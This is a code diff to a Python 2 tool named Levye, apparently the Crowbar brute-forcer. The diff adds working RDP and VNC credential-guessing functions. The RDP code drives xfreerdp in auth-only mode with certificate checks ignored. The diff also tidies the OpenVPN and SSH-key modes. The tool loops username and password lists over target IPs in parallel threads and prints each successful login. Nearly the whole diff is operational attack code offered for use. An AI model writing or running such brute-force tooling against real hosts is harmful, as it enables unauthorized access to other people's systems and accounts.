@@ -45,17 +45,23 @@ class Levye:
 		
 	def __init__(self):
 		
-		self.services = {"sshkey":self.sshkey,"rpd":self.rdp, "openvpn":self.openvpn, "vnckey":self.vnckey}
+		self.services = {"sshkey":self.sshkey,"rdp":self.rdp, "openvpn":self.openvpn, "vnckey":self.vnckey}
+
 		self.openvpn_path = "/usr/sbin/openvpn"		
 		self.vpn_failure = re.compile("SIGTERM\[soft,auth-failure\] received, process exiting")
 		self.vpn_success = re.compile("Initialization Sequence Completed")
+		self.xfreerdp_path = "/usr/bin/xfreerdp"
+		self.rdp_success = "Authentication only, exit status 0"
+		self.vncviewer_path = "/usr/bin/vncviewer"
+		self.vnc_success = "Authentication successful"
+		self.vnc_failure = "Authentication failed"
 
 		description = "Description ..."
                 usage = "Usage: use --help for futher information"
                 parser = argparse.ArgumentParser(description = description, usage = usage)
                 parser.add_argument('-b', '--brute', dest = 'brute', help = 'Brute Force Type', required = True)
 		parser.add_argument('-s', '--server', dest = 'server', action = 'store', help = 'Host File', required = True)                
-		parser.add_argument('-u', '--user', dest = 'username', action = 'store', help = 'User File', required = True)		
+		parser.add_argument('-u', '--user', dest = 'username', action = 'store', help = 'User File')		
 		parser.add_argument('-n', '--number', dest = 'thread', action = 'store', help = 'Thread Number', default = 5, type = int)		
 		parser.add_argument('-l', '--log', dest = 'log_file', action = 'store', help = 'Log File', type = file)				
                 parser.add_argument('-o', '--output', dest = 'output', action = 'store', help = 'Output Directory', type = file)		
@@ -90,16 +96,113 @@ class Levye:
 
 
 	def signal_handler(self, signal, frame):
+
         	print('Exiting ...')
         	sys.exit(37)	
 
 
-	def rdp(self, *options):
-		pass
+	def vnclogin(self, ip, port, passwd_file):	
+
+		vnc_cmd = "%s -passwd %s %s:%s"% (self.vncviewer_path, passwd_file, ip, port)
+		proc = subprocess.Popen(shlex.split(vnc_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)		
+
+		for line in iter(proc.stderr.readline, ''):
+			if re.search(self.vnc_success, line):
+				print "OK: %s:%s:%s"% (ip, port, passwd_file)
+				break
+
 
 
 	def vnckey(self, *options):
-		pass
+		
+		port = 5900
+		
+		if not os.path.exists(self.vncviewer_path):
+			print >> sys.stderr, "Vncviewer: %s path doesn't exists on the system !!!"% (self.vncviewer_path)
+			sys.exit(1)
+
+		if self.args.port is not None:
+			port = self.args.port
+				
+		if self.args.timeout is not None:
+			timeout = self.args.timeout	
+		
+		if self.args.thread is not None:
+			try:	
+				pool = ThreadPool(int(self.args.thread))
+			except Exception, err:
+				print >> sys.stderr, err
+				sys.exit(1)
+
+		if not self.args.passwd:
+			print >> sys.stderr, "Password must be specified !!!"
+			sys.exit(1)
+
+		if not os.path.isfile(self.args.passwd):
+			print >> sys.stderr, "Password must be file !!!"
+			sys.exit(1) 				
+
+			
+		for ip in self.ip_list:
+			pool.add_task(self.vnclogin, ip, port, self.args.passwd)
+					
+		pool.wait_completion()
+
+
+	def rdplogin(self, ip, user, password, port):
+		
+		rdp_cmd = "%s /sec:nla /p:%s /u:%s /port:%s /v:%s +auth-only /cert-ignore"% (self.xfreerdp_path, password, user, port, ip)
+		proc = subprocess.Popen(shlex.split(rdp_cmd), shell=False, stdout = subprocess.PIPE, stderr = subprocess.PIPE)		
+
+		for line in iter(proc.stderr.readline, ''):
+			if re.search(self.rdp_success, line):
+				print "OK: %s:%s:%s"% (ip,user,password)
+				break
+		
+
+	def rdp(self):
+		
+		port = 3389
+
+		if not os.path.exists(self.xfreerdp_path):
+			print >> sys.stderr, "Xfreerdp: %s path doesn't exists on the system !!!"% (self.xfreerdp_path)
+			sys.exit(1)
+
+		if self.args.port is not None:
+			port = self.args.port
+				
+		if self.args.timeout is not None:
+			timeout = self.args.timeout	
+		
+		if not self.args.passwd:
+			print >> sys.stderr, "Password file must be specified !!!"
+			sys.exit(1)
+
+		if self.args.thread is not None:
+			try:	
+				pool = ThreadPool(int(self.args.thread))
+			except Exception, err:
+				print >> sys.stderr, err
+				sys.exit(1)
+
+
+		for ip in self.ip_list:
+			if os.path.isfile(self.args.username):
+				for user in open(self.args.username, "r").read().splitlines():
+					if os.path.isfile(self.args.passwd):			
+						for password in open(self.args.passwd, "r").read().splitlines():
+							pool.add_task(self.rdplogin, ip, user, password, port)
+					else:
+						pool.add_task(self.rdplogin, ip, user, self.args.passwd, port)
+			else:
+				if os.path.isfile(self.args.passwd):
+					for password in open(self.args.passwd, "r").read().splitlines():
+						pool.add_task(self.rdplogin, ip, self.args.username, password, port)
+				else:
+					pool.add_task(self.rdplogin, ip, self.args.username, self.args.passwd, port)
+
+		pool.wait_completion()		
+			
 
 
 	def openvpnlogin(self, host, username, password, brute_file):
@@ -122,7 +225,7 @@ class Levye:
 			sys.exit(1)
 
 		if self.args.port is not None:
-			port = int(self.args.port)
+			port = self.args.port
 				
 		if self.args.timeout is not None:
 			timeout = self.args.timeout	
@@ -130,6 +233,15 @@ class Levye:
 		if not os.path.isfile(self.args.config):
 			print >> sys.stderr, "Config File %s Doesn't Exists !!!"% self.args.config
 			sys.exit(1)
+
+		if not self.args.passwd:
+			print >> sys.stderr, "Password file must be specified !!!"
+			sys.exit(1)
+
+		if not self.args.username:
+			print >> sys.stderr, "Username file must be specified !!!"
+			sys.exit(1)
+
 
 		if self.args.thread is not None:
 			try:	
@@ -150,7 +262,7 @@ class Levye:
 							brute_file.write(user + "\n")
 							brute_file.write(password + "\n")
 							brute_file.seek(0)
-							pool.add_task(self.openvpnlogin, ip, user, password, brute_file_name, )
+							pool.add_task(self.openvpnlogin, ip, user, password, brute_file_name)
 					else:
 						brute_file.write(user + "\n")
 						brute_file.write(self.args.passwd + "\n")
@@ -177,13 +289,11 @@ class Levye:
 		ssh = paramiko.SSHClient()	
 		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 		
-		#print "Verbose: %s:%s:%s:%s:%s"% (ip, port, user, keyfile, timeout)
 		try:
 			ssh.connect(ip, port, username=user, password=None, pkey=None, key_filename=keyfile, timeout=timeout, allow_agent=False, look_for_keys=False)
 			print "OK: %s:%s:%s:%s:%s"% (ip,port,user,keyfile,timeout)
 		except Exception ,err:
 			pass
-			#print err								
 			
 
 	def sshkey(self):
@@ -195,6 +305,11 @@ class Levye:
 		
 		if self.args.timeout is not None:
 			timeout = self.args.timeout	
+
+		if not self.args.username:
+			print >> sys.stderr, "Username file must be specified !!!"
+			sys.exit(1)
+
 		
 		if self.args.thread is not None:
 			try:
